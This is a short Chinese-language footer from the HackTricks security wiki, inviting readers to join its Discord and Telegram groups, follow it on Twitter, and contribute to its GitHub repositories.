* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 **上关注我们** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}
